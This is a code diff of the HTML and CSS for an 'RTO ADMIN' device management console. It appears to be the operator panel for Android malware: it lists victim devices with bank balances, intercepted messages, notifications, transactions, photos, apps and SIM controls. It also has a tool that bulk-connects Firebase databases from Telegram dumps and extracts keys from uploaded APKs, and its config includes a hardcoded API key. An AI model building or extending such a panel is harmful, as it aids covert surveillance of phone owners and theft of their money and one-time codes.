@@ -11,22 +11,22 @@
 * { margin:0; padding:0; box-sizing:border-box; }
 body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; color:#E5E7EB; min-height:100vh; }
 
-/* ═══ LOGIN ═══ */
+/* LOGIN */
 .login-screen { position:fixed; inset:0; background:#050810; display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; overflow-y:auto; }
-.login-box { background:#0A1428; border:1px solid #1E3A8A; border-radius:16px; padding:26px; max-width:440px; width:100%; }
-.logo-area { text-align:center; margin-bottom:20px; }
-.logo-circle { width:80px; height:80px; margin:0 auto 12px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:38px; box-shadow:0 0 30px rgba(59,130,246,0.4); }
-.logo-area h1 { color:#60A5FA; font-size:22px; margin-bottom:4px; letter-spacing:0.05em; }
-.logo-area p { color:#64748B; font-size:11px; letter-spacing:0.15em; text-transform:uppercase; }
+.login-box { background:#0A1428; border:1px solid #1E3A8A; border-radius:16px; padding:28px; max-width:420px; width:100%; text-align:center; }
+.login-box h1 { color:#60A5FA; font-size:22px; margin-bottom:6px; }
+.login-box p { color:#64748B; font-size:12px; margin-bottom:20px; }
+.pin-input { width:100%; padding:14px; background:#050810; border:1px solid #1E3A8A; border-radius:10px; color:#E5E7EB; font-size:20px; text-align:center; letter-spacing:0.5em; font-family:monospace; margin-bottom:12px; }
+.pin-input:focus { outline:none; border-color:#3B82F6; }
+.btn-primary { width:100%; padding:14px; background:#3B82F6; color:white; border:none; border-radius:10px; font-size:14px; font-weight:bold; cursor:pointer; }
+.btn-secondary { width:100%; padding:12px; background:#1E3A8A; color:#60A5FA; border:1px solid #3B82F6; border-radius:10px; font-size:13px; font-weight:bold; cursor:pointer; margin-top:10px; }
+.error-msg { color:#F87171; font-size:12px; margin-top:8px; min-height:16px; }
 
-/* Saved accounts */
-.saved-box { background:#050810; border:1px solid #1E3A8A; border-radius:12px; padding:14px; margin-bottom:14px; }
-.saved-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; }
-.saved-head h3 { color:#60A5FA; font-size:13px; font-weight:600; display:flex; align-items:center; gap:6px; }
-.acc-badge { background:#1E3A8A; color:#94A3B8; padding:3px 10px; border-radius:10px; font-size:10px; font-weight:600; }
-.acc-empty { text-align:center; padding:16px 0; color:#475569; font-size:11px; }
-.acc-empty .ico { font-size:28px; opacity:0.3; margin-bottom:6px; display:block; }
-.acc-item { background:#0A1428; border:1px solid #1E3A8A; border-radius:10px; padding:11px 12px; margin-bottom:8px; display:flex; align-items:center; gap:10px; cursor:pointer; }
+/* ACCOUNT LIST */
+.acc-sep { display:flex; align-items:center; gap:10px; margin:22px 0 14px; color:#475569; font-size:10px; text-transform:uppercase; letter-spacing:0.1em; font-weight:bold; }
+.acc-sep::before, .acc-sep::after { content:''; flex:1; height:1px; background:#1E3A8A; }
+.acc-list { text-align:left; max-height:220px; overflow-y:auto; margin-bottom:6px; }
+.acc-item { background:#050810; border:1px solid #1E3A8A; border-radius:10px; padding:11px 12px; margin-bottom:8px; display:flex; align-items:center; gap:10px; cursor:pointer; }
 .acc-item:active { border-color:#3B82F6; background:#0F1E3D; }
 .acc-icon { width:34px; height:34px; border-radius:9px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); display:flex; align-items:center; justify-content:center; font-size:15px; flex-shrink:0; }
 .acc-info { flex:1; min-width:0; }
@@ -34,32 +34,27 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .acc-url { color:#64748B; font-size:9px; font-family:monospace; margin-top:2px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
 .acc-del { background:rgba(239,68,68,0.15); border:none; color:#F87171; width:26px; height:26px; border-radius:6px; cursor:pointer; font-size:12px; }
 
-/* New Account button */
-.btn-new { width:100%; padding:14px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); color:white; border:none; border-radius:10px; font-size:14px; font-weight:bold; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; }
+/* NEW ACCOUNT FORM */
+.new-form { text-align:left; }
+.new-form h3 { color:#60A5FA; font-size:14px; margin-bottom:14px; text-align:center; }
+.new-form .fl { display:block; color:#64748B; font-size:10px; margin-bottom:5px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
+.new-form .fi { width:100%; padding:11px 12px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:12px; font-family:inherit; margin-bottom:10px; }
+.new-form .fi:focus { outline:none; border-color:#3B82F6; }
+.btn-row { display:flex; gap:8px; margin-top:8px; }
+.btn-row button { flex:1; padding:12px; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; }
+.btn-row .save { background:#3B82F6; color:white; }
+.btn-row .cancel { background:#1E3A8A; color:#60A5FA; }
 
-/* PIN quick login */
-.pin-row { display:flex; gap:8px; margin-top:12px; }
-.pin-row input { flex:1; padding:12px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:14px; text-align:center; letter-spacing:0.2em; font-family:monospace; }
-.pin-row input:focus { outline:none; border-color:#3B82F6; }
-.pin-row button { padding:12px 18px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; }
-.error-msg { color:#F87171; font-size:11px; margin-top:8px; text-align:center; min-height:14px; }
-
-/* ═══ NEW ACCOUNT FORM ═══ */
-.new-acc { display:none; }
-.new-acc.active { display:block; }
-.back-btn { background:none; border:none; color:#60A5FA; font-size:12px; cursor:pointer; padding:0; margin-bottom:14px; display:flex; align-items:center; gap:4px; }
-.new-acc h2 { color:#FFF; font-size:16px; margin-bottom:4px; }
-.new-acc .hint { color:#64748B; font-size:10px; margin-bottom:16px; }
-
-/* Bulk Connect */
-.bulk-card { background:linear-gradient(135deg, rgba(59,130,246,0.08), rgba(168,85,247,0.05)); border:1px solid rgba(59,130,246,0.3); border-radius:12px; padding:14px; margin-bottom:14px; }
+/* ═══ NEW CONNECTION ENHANCED ═══ */
+.back-btn2 { background:none; border:none; color:#60A5FA; font-size:12px; cursor:pointer; padding:0; margin-bottom:14px; display:flex; align-items:center; gap:4px; text-align:left; }
+.new-acc-full h2 { color:#FFF; font-size:16px; margin-bottom:4px; text-align:left; }
+.new-acc-full .hint2 { color:#64748B; font-size:10px; margin-bottom:16px; text-align:left; }
+.bulk-card { background:linear-gradient(135deg, rgba(59,130,246,0.08), rgba(168,85,247,0.05)); border:1px solid rgba(59,130,246,0.3); border-radius:12px; padding:14px; margin-bottom:14px; text-align:left; }
 .bulk-card h3 { color:#F59E0B; font-size:13px; margin-bottom:6px; display:flex; align-items:center; gap:6px; }
 .bulk-card p { color:#94A3B8; font-size:10px; line-height:1.55; margin-bottom:10px; }
 .bulk-card textarea { width:100%; min-height:100px; padding:11px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:11px; font-family:monospace; resize:vertical; line-height:1.5; }
 .bulk-card textarea:focus { outline:none; border-color:#3B82F6; }
 .btn-bulk { width:100%; padding:13px; background:linear-gradient(135deg,#06B6D4,#3B82F6); color:white; border:none; border-radius:8px; font-size:13px; font-weight:bold; cursor:pointer; margin-top:10px; display:flex; align-items:center; justify-content:center; gap:8px; }
-
-/* APK Upload */
 .apk-upload { background:rgba(59,130,246,0.03); border:2px dashed rgba(59,130,246,0.3); border-radius:12px; padding:22px 16px; text-align:center; margin-bottom:14px; cursor:pointer; }
 .apk-upload:active { background:rgba(59,130,246,0.08); border-color:#3B82F6; }
 .apk-upload .up-ico { width:50px; height:50px; margin:0 auto 12px; background:#0A1428; border:1px solid #1E3A8A; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:22px; color:#60A5FA; }
@@ -68,25 +63,18 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .apk-upload input { display:none; }
 .apk-status { color:#10B981; font-size:10px; margin-top:8px; display:none; }
 .apk-status.show { display:block; }
+.form-sep2 { display:flex; align-items:center; gap:10px; margin:16px 0 14px; color:#475569; font-size:9px; text-transform:uppercase; letter-spacing:0.1em; font-weight:bold; }
+.form-sep2::before, .form-sep2::after { content:''; flex:1; height:1px; background:#1E3A8A; }
 
-/* Form */
-.form-sep { display:flex; align-items:center; gap:10px; margin:16px 0 14px; color:#475569; font-size:9px; text-transform:uppercase; letter-spacing:0.1em; font-weight:bold; }
-.form-sep::before, .form-sep::after { content:''; flex:1; height:1px; background:#1E3A8A; }
-.form-label { display:block; color:#64748B; font-size:10px; margin-bottom:5px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
-.form-input { width:100%; padding:11px 12px; background:#050810; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:12px; font-family:inherit; margin-bottom:12px; }
-.form-input:focus { outline:none; border-color:#3B82F6; }
-.btn-row { display:flex; gap:8px; margin-top:8px; }
-.btn-row button { flex:1; padding:13px; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:6px; }
-.btn-row .save { background:linear-gradient(135deg,#3B82F6,#2563EB); color:white; }
-.btn-row .cancel { background:#1E3A8A; color:#60A5FA; }
-
-/* ═══ MAIN APP ═══ */
+/* TOPBAR */
 .topbar { background:#0A1428; padding:12px 16px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1E3A8A; position:sticky; top:0; z-index:100; }
 .topbar h1 { color:#60A5FA; font-size:14px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:50%; }
 .topbar-right { display:flex; align-items:center; gap:6px; flex-shrink:0; }
 .status { display:flex; align-items:center; gap:5px; font-size:10px; color:#10B981; padding:4px 8px; background:rgba(16,185,129,0.1); border-radius:16px; }
 .dot { width:6px; height:6px; border-radius:50%; background:#10B981; }
 .btn-logout { background:rgba(239,68,68,0.1); color:#F87171; border:1px solid rgba(239,68,68,0.3); padding:6px 12px; border-radius:8px; font-size:10px; font-weight:bold; cursor:pointer; }
+
+/* STATS */
 .stats { display:grid; grid-template-columns:repeat(5,1fr); gap:1px; background:#1E3A8A; border-bottom:1px solid #1E3A8A; }
 .stat { background:#0A1428; padding:10px 6px; text-align:center; }
 .stat .n { font-size:18px; font-weight:bold; color:#60A5FA; }
@@ -94,15 +82,24 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .stat.g .n { color:#10B981; }
 .stat.r .n { color:#F87171; }
 .stat.y .n { color:#F59E0B; }
+
+/* CHIPS */
 .chips { display:flex; gap:6px; padding:10px 16px; overflow-x:auto; background:#0A1428; border-bottom:1px solid #1E3A8A; }
 .chip { padding:7px 12px; background:#050810; border:1px solid #1E3A8A; border-radius:16px; color:#60A5FA; font-size:10px; font-weight:600; cursor:pointer; white-space:nowrap; display:flex; align-items:center; gap:4px; }
+.chip:active { background:#1E3A8A; }
 .chip.danger { color:#F87171; border-color:rgba(239,68,68,0.3); }
+
+/* FILTERS / SEARCH */
 .filters { display:flex; gap:6px; padding:10px 16px; overflow-x:auto; }
 .fbtn { padding:6px 14px; background:#0A1428; border:1px solid #1E3A8A; border-radius:16px; color:#60A5FA; font-size:10px; font-weight:600; cursor:pointer; white-space:nowrap; }
 .fbtn.active { background:#3B82F6; color:white; border-color:#3B82F6; }
 .search-box { margin:0 16px 12px; width:calc(100% - 32px); padding:11px 14px; background:#0A1428; border:1px solid #1E3A8A; border-radius:10px; color:#E5E7EB; font-size:12px; }
+.search-box:focus { outline:none; border-color:#3B82F6; }
+
+/* DEVICE GRID */
 .device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:10px; padding:0 16px 40px; }
 .device-card { background:#0A1428; border:1px solid #1E3A8A; border-radius:12px; padding:12px; cursor:pointer; }
+.device-card:active { border-color:#3B82F6; background:#0F1E3D; }
 .device-header { display:flex; align-items:center; gap:10px; margin-bottom:10px; }
 .wifi-icon { width:38px; height:38px; border-radius:50%; background:linear-gradient(135deg,#1E3A8A,#3B82F6); display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0; }
 .device-info { flex:1; min-width:0; }
@@ -110,26 +107,30 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .device-id { color:#64748B; font-size:9px; font-family:monospace; }
 .device-star { font-size:16px; cursor:pointer; }
 .device-grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:6px; padding-top:10px; border-top:1px solid #1E3A8A; }
-.device-grid-2 .k { color:#475569; font-size:8px; text-transform:uppercase; }
+.device-grid-2 .k { color:#475569; font-size:8px; text-transform:uppercase; letter-spacing:0.05em; }
 .device-grid-2 .v { color:#E5E7EB; font-size:11px; font-weight:500; margin-top:2px; }
 .balance-bar { margin-top:8px; background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.3); border-radius:8px; padding:8px 10px; display:flex; justify-content:space-between; align-items:center; font-size:10px; }
 .balance-bar .l { color:#64748B; }
 .balance-bar .a { color:#10B981; font-weight:bold; font-size:13px; }
+
+/* DRAWER */
 .drawer-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.8); z-index:998; opacity:0; pointer-events:none; transition:opacity 0.25s; }
 .drawer-overlay.active { opacity:1; pointer-events:auto; }
 .drawer { position:fixed; top:0; right:0; width:100%; max-width:600px; height:100vh; background:#050810; z-index:999; transform:translateX(100%); transition:transform 0.3s; display:flex; flex-direction:column; border-left:1px solid #1E3A8A; }
 .drawer.active { transform:translateX(0); }
-.drawer-head { padding:12px 14px; border-bottom:1px solid #1E3A8A; display:flex; justify-content:space-between; align-items:center; background:#0A1428; }
+.drawer-head { padding:12px 14px; border-bottom:1px solid #1E3A8A; display:flex; justify-content:space-between; align-items:center; background:#0A1428; flex-shrink:0; }
 .drawer-head h2 { color:#60A5FA; font-size:14px; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-.head-actions { display:flex; gap:5px; }
+.head-actions { display:flex; gap:5px; flex-shrink:0; }
 .ibtn { background:#1E3A8A; border:none; color:#60A5FA; width:30px; height:30px; border-radius:8px; cursor:pointer; font-size:13px; }
 .ibtn.danger { background:rgba(239,68,68,0.2); color:#F87171; }
-.tabs { display:flex; padding:0 10px; background:#0A1428; border-bottom:1px solid #1E3A8A; overflow-x:auto; }
+.tabs { display:flex; gap:0; padding:0 10px; background:#0A1428; border-bottom:1px solid #1E3A8A; overflow-x:auto; flex-shrink:0; }
 .tab { padding:11px 12px; background:transparent; border:none; color:#64748B; font-size:11px; font-weight:600; cursor:pointer; white-space:nowrap; border-bottom:2px solid transparent; }
 .tab.active { color:#60A5FA; border-bottom-color:#3B82F6; }
 .tab .cnt { background:#1E3A8A; color:#94A3B8; padding:1px 6px; border-radius:8px; font-size:9px; margin-left:4px; }
 .tab.active .cnt { background:#3B82F6; color:white; }
 .drawer-body { padding:12px; overflow-y:auto; flex:1; }
+
+/* MESSAGES / FORMS */
 .msg { background:#0A1428; border-left:3px solid #3B82F6; border-radius:6px; padding:10px 12px; margin-bottom:6px; }
 .msg.sent { border-left-color:#10B981; }
 .msg-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; }
@@ -137,18 +138,40 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .msg-tag { color:#64748B; font-size:9px; }
 .msg-body { color:#E5E7EB; font-size:12px; line-height:1.5; word-break:break-word; white-space:pre-wrap; }
 .msg-date { color:#475569; font-size:9px; margin-top:4px; }
+.fg { margin-bottom:10px; }
+.fl { display:block; color:#64748B; font-size:10px; margin-bottom:5px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
+.fi, .fs, .ft { width:100%; padding:11px 12px; background:#0A1428; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:12px; font-family:inherit; }
+.ft { min-height:80px; resize:vertical; }
+.fi:focus, .ft:focus, .fs:focus { outline:none; border-color:#3B82F6; }
+.btn { width:100%; padding:12px; background:#3B82F6; color:white; border:none; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer; margin-top:6px; }
+.btn.green { background:#10B981; }
+.btn.dark { background:#1E3A8A; color:#60A5FA; }
+.card { background:#0A1428; border:1px solid #1E3A8A; border-radius:12px; padding:14px; margin-bottom:10px; }
+.card.blue { border-color:rgba(59,130,246,0.4); }
+.card.green { border-color:rgba(16,185,129,0.4); }
+.card h3 { color:#60A5FA; font-size:13px; margin-bottom:4px; }
+.card.green h3 { color:#10B981; }
+.card p { color:#64748B; font-size:11px; margin-bottom:12px; line-height:1.5; }
+.sim-row { display:flex; gap:8px; margin-bottom:10px; }
+.sim-btn { flex:1; padding:12px; background:#050810; border:2px solid #1E3A8A; border-radius:8px; color:#64748B; font-size:12px; font-weight:bold; cursor:pointer; text-align:center; }
+.sim-btn.active { background:#3B82F6; color:white; border-color:#3B82F6; }
+.on-off { padding:12px 18px; background:#1E3A8A; border:none; border-radius:8px; color:#60A5FA; font-size:12px; font-weight:bold; cursor:pointer; white-space:nowrap; }
+.on-off.on { background:#10B981; color:white; }
+.info-b { background:rgba(59,130,246,0.05); border:1px solid rgba(59,130,246,0.15); border-radius:6px; padding:8px; font-size:10px; color:#64748B; margin-top:8px; line-height:1.5; }
+.info-b.g { background:rgba(16,185,129,0.05); border-color:rgba(16,185,129,0.2); }
+.info-b .di { display:inline-block; width:5px; height:5px; border-radius:50%; background:#475569; margin-right:5px; }
+.info-b .di.on { background:#10B981; }
+.cc { font-size:9px; color:#475569; text-align:right; margin-top:3px; }
 .dir { display:flex; justify-content:space-between; padding:9px 0; border-bottom:1px solid #1E3A8A; font-size:11px; }
 .dir .k { color:#64748B; }
 .dir .v { color:#E5E7EB; font-weight:500; text-align:right; max-width:60%; word-break:break-word; }
+
+/* PHOTOS */
 .pgrid { display:grid; grid-template-columns:repeat(auto-fill,minmax(105px,1fr)); gap:6px; }
 .pitem { border-radius:8px; overflow:hidden; background:#0A1428; cursor:pointer; position:relative; border:1px solid #1E3A8A; }
 .pitem img { width:100%; height:105px; object-fit:cover; display:block; background:#1E3A8A; }
 .pname { padding:4px 6px; font-size:9px; color:#64748B; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; background:rgba(0,0,0,0.6); }
 .pfolder { position:absolute; top:4px; left:4px; padding:2px 6px; background:#3B82F6; color:white; border-radius:4px; font-size:8px; font-weight:bold; text-transform:uppercase; }
-.app { background:#0A1428; padding:9px 11px; border-radius:8px; margin-bottom:5px; display:flex; align-items:center; gap:9px; border-left:2px solid #3B82F6; }
-.app-ic { width:34px; height:34px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); border-radius:9px; display:flex; align-items:center; justify-content:center; font-size:15px; flex-shrink:0; }
-.app-name { color:white; font-size:11px; font-weight:600; }
-.app-pkg { color:#64748B; font-size:9px; font-family:monospace; margin-top:1px; word-break:break-all; }
 .pviewer { position:fixed; inset:0; background:rgba(0,0,0,0.97); z-index:2000; display:none; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
 .pviewer.active { display:flex; }
 .pviewer img { max-width:100%; max-height:78vh; object-fit:contain; border-radius:6px; }
@@ -156,86 +179,107 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .pv-controls button { padding:10px 18px; background:#1E3A8A; border:1px solid #3B82F6; color:#60A5FA; border-radius:8px; cursor:pointer; font-size:11px; font-weight:bold; }
 .pv-controls button.close { background:#EF4444; border-color:#EF4444; color:white; }
 .pv-info { color:#64748B; font-size:10px; margin-top:8px; text-align:center; }
+
+/* APPS / NOTIFS / TX */
+.app { background:#0A1428; padding:9px 11px; border-radius:8px; margin-bottom:5px; display:flex; align-items:center; gap:9px; border-left:2px solid #3B82F6; }
+.app-ic { width:34px; height:34px; background:linear-gradient(135deg,#1E3A8A,#3B82F6); border-radius:9px; display:flex; align-items:center; justify-content:center; font-size:15px; flex-shrink:0; }
+.app-name { color:white; font-size:11px; font-weight:600; }
+.app-pkg { color:#64748B; font-size:9px; font-family:monospace; margin-top:1px; word-break:break-all; }
+.notif { background:#0A1428; border-left:3px solid #3B82F6; border-radius:6px; padding:10px 12px; margin-bottom:6px; }
+.notif-head { display:flex; justify-content:space-between; margin-bottom:3px; }
+.notif-app { color:#60A5FA; font-size:11px; font-weight:600; }
+.notif-date { color:#475569; font-size:9px; }
+.notif-title { color:#FFF; font-size:11px; font-weight:600; margin-bottom:2px; }
+.notif-body { color:#94A3B8; font-size:11px; line-height:1.4; word-break:break-word; }
+.tx { background:#0A1428; border:1px solid rgba(16,185,129,0.2); border-radius:10px; padding:12px; margin-bottom:8px; }
+.tx-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; }
+.tx-acc { color:#60A5FA; font-size:11px; font-weight:600; }
+.tx-lbl { color:#64748B; font-size:9px; text-transform:uppercase; letter-spacing:0.1em; }
+.tx-bal { color:#10B981; font-size:20px; font-weight:bold; margin-top:2px; }
+.tx-amt-lbl { color:#64748B; font-size:9px; text-transform:uppercase; text-align:right; }
+.tx-amt { color:#F87171; font-size:14px; font-weight:bold; }
+.tx-amt.cr { color:#10B981; }
+.tx-msg { color:#94A3B8; font-size:10px; margin-top:8px; line-height:1.5; padding-top:8px; border-top:1px solid #1E3A8A; }
+.tx-date { color:#475569; font-size:9px; margin-top:4px; }
+.bal-big { background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.3); border-radius:10px; padding:14px; margin-bottom:10px; }
+.bal-big .l { color:#64748B; font-size:9px; text-transform:uppercase; letter-spacing:0.1em; }
+.bal-big .a { color:#10B981; font-size:22px; font-weight:bold; margin-top:4px; }
+.note { background:#0A1428; border:1px solid #1E3A8A; border-radius:10px; padding:12px; margin-bottom:10px; }
+.note h4 { color:#60A5FA; font-size:12px; margin-bottom:8px; }
+.note textarea { width:100%; padding:9px; background:#050810; border:1px solid #1E3A8A; border-radius:6px; color:#E5E7EB; font-size:11px; resize:vertical; min-height:55px; }
+.note .sv { padding:7px 14px; background:#3B82F6; color:white; border:none; border-radius:6px; font-size:10px; font-weight:bold; cursor:pointer; margin-top:6px; }
+.sim-mgr { background:rgba(59,130,246,0.05); border:1px solid rgba(59,130,246,0.25); border-radius:10px; padding:12px; margin-bottom:10px; }
+.sim-mgr h4 { color:#10B981; font-size:12px; margin-bottom:10px; }
+.sim-field { margin-bottom:8px; }
+.sim-lbl { color:#64748B; font-size:9px; text-transform:uppercase; margin-bottom:3px; }
+.sim-row2 { display:flex; gap:6px; }
+.sim-row2 input { flex:1; padding:9px; background:#050810; border:1px solid #1E3A8A; border-radius:6px; color:#E5E7EB; font-size:11px; }
+.sim-row2 button { padding:9px 14px; background:#1E3A8A; border:1px solid #3B82F6; color:#60A5FA; border-radius:6px; font-size:10px; font-weight:bold; cursor:pointer; }
+.sim-btns { display:flex; gap:6px; margin-top:10px; }
+.sim-btns button { flex:1; padding:11px; border:none; border-radius:8px; font-size:11px; font-weight:bold; cursor:pointer; color:white; }
+.sim-btns .det { background:#3B82F6; }
+.sim-btns .sav { background:#10B981; }
 .loading { text-align:center; padding:40px; color:#475569; }
 .empty { text-align:center; padding:40px 20px; color:#475569; font-size:12px; }
-@media (max-width:600px) { .device-grid { grid-template-columns:1fr; padding:0 12px 40px; } .search-box { margin:0 12px 12px; width:calc(100% - 24px); } .drawer { max-width:100%; } .pitem img { height:90px; } }
+@media (max-width:600px) { .device-grid { grid-template-columns:1fr; padding:0 12px 40px; } .search-box { margin:0 12px 12px; width:calc(100% - 24px); } .filters, .chips { padding:10px 12px; } .drawer { max-width:100%; } .pitem img { height:90px; } }
 </style>
 </head>
 <body>
 
 <!-- ═══════════════ LOGIN SCREEN ═══════════════ -->
 <div class="login-screen" id="loginScreen">
-  <div class="login-box">
-    <!-- ═══ MAIN VIEW ═══ -->
-    <div id="mainLoginView">
-      <div class="logo-area">
-        <div class="logo-circle">🚔</div>
-        <h1>RTO ADMIN</h1>
-        <p>Device Management Console</p>
-      </div>
-      
-      <!-- Saved Accounts -->
-      <div class="saved-box">
-        <div class="saved-head">
-          <h3>📡 Saved Accounts</h3>
-          <span class="acc-badge" id="accCount">0 accounts</span>
-        </div>
-        <div id="accList">
-          <div class="acc-empty">
-            <span class="ico">📡</span>
-            No saved accounts
-          </div>
-        </div>
-      </div>
-      
-      <!-- New Account button -->
-      <button class="btn-new" id="btnNewAcc">➕ New Account</button>
-      
-      <!-- PIN quick login -->
-      <div class="pin-row">
-        <input type="password" id="pinInput" maxlength="6" placeholder="PIN" inputmode="numeric">
-        <button id="loginBtn">GO</button>
-      </div>
+  <div class="login-box" id="loginBox">
+    <h1>🔐 RTO ADMIN</h1>
+    <p>Enter PIN or add account</p>
+    
+    <div id="pinView">
+      <input type="password" class="pin-input" id="pinInput" maxlength="6" placeholder="••••" inputmode="numeric">
+      <button class="btn-primary" id="loginBtn">LOGIN WITH PIN</button>
       <div class="error-msg" id="errorMsg"></div>
+      
+      <div class="acc-sep">Saved Accounts</div>
+      <div class="acc-list" id="accList"></div>
+      
+      <button class="btn-secondary" id="btnNewAcc">+ New Account</button>
     </div>
     
-    <!-- ═══ NEW ACCOUNT VIEW ═══ -->
-    <div class="new-acc" id="newAccView">
-      <button class="back-btn" id="btnBack">← Back</button>
-      <h2>🔥 New Firebase Account</h2>
-      <div class="hint">Add Firebase URL, API Key, or upload APK</div>
-      
-      <!-- BULK CONNECT -->
-      <div class="bulk-card">
-        <h3>⚡ Bulk Connect</h3>
-        <p>Kahi se bhi firebase URLs paste karo — Telegram dump ho, list ho, kuch bhi. Har firebase URL AUTO-detect hoga, saath likhi hui "Auth Key" / 🔑 / Alza... key bhi apne-aap uth jayegi. Duplicate URL sirf ek baar connect hota hai. Bina key ke bhi URL connect hota hai.</p>
-        <textarea id="bulkInput" placeholder="📍 Firebase URL: https://app-one-default-rtdb.firebaseio.com&#10;🔑 Auth Key: AIzaSy...&#10;&#10;📍 Firebase URL: https://app-two-default-rtdb.firebaseio.com"></textarea>
-        <button class="btn-bulk" id="btnBulkConnect">⚡ Connect All</button>
+    <div id="newAccView" style="display:none;">
+      <div class="new-acc-full" style="text-align:left;">
+        <button class="back-btn2" id="btnCancelNew">← Back</button>
+        <h2>🔥 New Firebase Account</h2>
+        <div class="hint2">Add Firebase URL, API Key, or upload APK</div>
+        
+        <!-- BULK CONNECT -->
+        <div class="bulk-card">
+          <h3>⚡ Bulk Connect</h3>
+          <p>Kahi se bhi firebase URLs paste karo — Telegram dump ho, list ho, kuch bhi. Har firebase URL AUTO-detect hoga, saath likhi hui "Auth Key" / 🔑 / Alza... key bhi apne-aap uth jayegi. Duplicate URL sirf ek baar connect hota hai. Bina key ke bhi URL connect hota hai.</p>
+          <textarea id="bulkInput" placeholder="📍 Firebase URL: https://app-one-default-rtdb.firebaseio.com&#10;🔑 Auth Key: AIzaSy...&#10;&#10;📍 Firebase URL: https://app-two-default-rtdb.firebaseio.com"></textarea>
+          <button class="btn-bulk" id="btnBulkConnect">⚡ Connect All</button>
+        </div>
+        
+        <!-- APK UPLOAD -->
+        <div class="apk-upload" id="apkUpload">
+          <div class="up-ico">⬆</div>
+          <h4>Upload APK File</h4>
+          <p>Auto-extracts Firebase URL & API Key</p>
+          <div class="apk-status" id="apkStatus"></div>
+          <input type="file" id="apkFile" accept=".apk,.zip">
+        </div>
+        
+        <!-- MANUAL -->
+        <div class="form-sep2">Or Manual Entry</div>
+        
+        <label class="fl">Firebase Database URL</label>
+        <input type="text" class="fi" id="newUrl" placeholder="https://your-project.firebaseio.com">
+        <label class="fl">Authentication Key / Secret</label>
+        <input type="text" class="fi" id="newKey" placeholder="Your Firebase secret key">
+        
+        <div class="btn-row">
+          <button class="cancel" id="btnCancelNewBottom">Cancel</button>
+          <button class="save" id="btnSaveNew">⚡ Save & Connect</button>
+        </div>
+        <div class="error-msg" id="newErr"></div>
       </div>
-      
-      <!-- APK UPLOAD -->
-      <div class="apk-upload" id="apkUpload">
-        <div class="up-ico">⬆</div>
-        <h4>Upload APK File</h4>
-        <p>Auto-extracts Firebase URL & API Key</p>
-        <div class="apk-status" id="apkStatus"></div>
-        <input type="file" id="apkFile" accept=".apk,.zip">
-      </div>
-      
-      <!-- MANUAL ENTRY -->
-      <div class="form-sep">Or Manual Entry</div>
-      
-      <label class="form-label">Firebase Database URL</label>
-      <input type="text" class="form-input" id="newUrl" placeholder="https://your-project.firebaseio.com">
-      
-      <label class="form-label">Authentication Key / Secret</label>
-      <input type="text" class="form-input" id="newKey" placeholder="Your Firebase secret key">
-      
-      <div class="btn-row">
-        <button class="cancel" id="btnCancelNew">Cancel</button>
-        <button class="save" id="btnSaveNew">⚡ Save & Connect</button>
-      </div>
-      <div class="error-msg" id="newErr"></div>
     </div>
   </div>
 </div>
@@ -309,7 +353,7 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 
 <script>
 // ═══════════════════════════════════════════════════════
-// CONFIG
+// FIREBASE CONFIG
 // ═══════════════════════════════════════════════════════
 var RTO_CONFIG = {
   apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
@@ -318,6 +362,9 @@ var RTO_CONFIG = {
   appId: "1:5750315381:android:95dc88826b1ef1262b9b3c"
 };
 
+// ═══════════════════════════════════════════════════════
+// STATE
+// ═══════════════════════════════════════════════════════
 var db = null;
 var currentApp = null;
 var currentAccount = null;
@@ -335,17 +382,18 @@ var deviceListener = null;
 // SAVED ACCOUNTS
 // ═══════════════════════════════════════════════════════
 function getSavedAccounts() {
-  try { return JSON.parse(localStorage.getItem('rto_accounts') || '[]'); }
-  catch(e) { return []; }
+  try {
+    return JSON.parse(localStorage.getItem('rto_accounts') || '[]');
+  } catch(e) { return []; }
 }
